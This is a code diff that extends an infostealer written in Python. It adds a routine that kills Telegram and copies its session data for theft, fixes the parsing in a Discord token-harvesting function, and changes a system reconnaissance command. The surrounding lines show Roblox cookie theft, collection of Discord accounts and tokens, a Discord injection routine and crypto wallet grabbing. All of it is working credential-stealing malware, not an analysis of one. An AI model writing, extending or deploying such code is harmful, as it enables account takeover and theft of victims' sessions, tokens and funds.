@@ -410,7 +410,6 @@ class Main:
                 except:continue
         except:
             pass
-    
     async def GetHistory(self) -> None:
         try:
             for path in self.profiles_full_path:
@@ -980,6 +979,29 @@ class Main:
             pass
         else:
             self.robloxSessionList.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
+    async def StealTelegramSession(self, directory_path: str) -> None:
+        try:
+            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop","tdata")
+            if os.path.exists(tg_path):
+                copy_path = os.path.join(directory_path, "Telegram Session")
+                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
+                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                await processes.communicate() 
+                if not os.path.exists(copy_path):
+                    os.mkdir(copy_path)
+                for dirs in os.listdir(tg_path):
+                    try:
+                        _path = os.path.join(tg_path, dirs)
+                        if not dirs in black_listed_dirs:
+                            dir_name = _path.split("\\")[7]
+                            if os.path.isfile(_path):
+                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
+                            elif os.path.isdir(_path):
+                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
+                            else:continue
+                    except:continue
+        except:
+            pass
     async def GetTokens(self) -> None:
         try:
             discord_dirs = {
@@ -1212,11 +1234,11 @@ class Main:
             premium_type = data["premium_type"]
             if premium_type == 0:
                 nitroType='None'
-            elif premium_type['premium_type'] == 1:
+            elif premium_type == 1:
                 nitroType = 'Nitro Classic'
-            elif premium_type['premium_type'] == 2:
+            elif premium_type == 2:
                 nitroType = 'Nitro'
-            elif premium_type['premium_type'] == 3:
+            elif premium_type == 3:
                 nitroType = 'Nitro Basic'
             else:
                 nitroType = 'None'
@@ -1288,7 +1310,6 @@ class Main:
                 self.discordAccountList.append(f"Username : {data['username']}#{data['discriminator']}\nEmail : {data['email']}\nID : {data['id']}\nPhone : {str(data['phone'])}\nMFA Enabled : {data['mfa_enabled']}\nNitro Type : {nitroType}\nToken : {token}\nBiography : {bio}\nGift Codes : {str(codes)}\n======================================================================\n")
 
         except Exception as e:
-            os.system("cls")
             print(e)
 
     async def DiscordInjection(self) -> None:
@@ -1466,11 +1487,10 @@ class Main:
             result = await asyncio.create_subprocess_shell('chcp', stdout=asyncio.subprocess.PIPE, shell=True)
             stdout, _ = await result.communicate()
             current_code_page = stdout.decode().split(":")[1].strip()
-            result = await asyncio.create_subprocess_shell('echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config', stdout=asyncio.subprocess.PIPE, shell=True)
+            result = await asyncio.create_subprocess_shell('whoami', stdout=asyncio.subprocess.PIPE, shell=True)
             stdout, _ = await result.communicate()
             self.systeminfoList.append(stdout.decode(current_code_page))
         except Exception as e:
-            os.system("cls")
             print(e)
     async def GetNetworkInfo(self) -> None:
         try:    
@@ -1527,6 +1547,7 @@ class Main:
                 shutil.rmtree(filePath)
             os.mkdir(filePath)
             await self.GetWallets(filePath)
+            await self.StealTelegramSession(filePath)
             os.mkdir(os.path.join(filePath, "Browsers"))
             os.mkdir(os.path.join(filePath, "Sessions"))
             os.mkdir(os.path.join(filePath, "Tokens"))
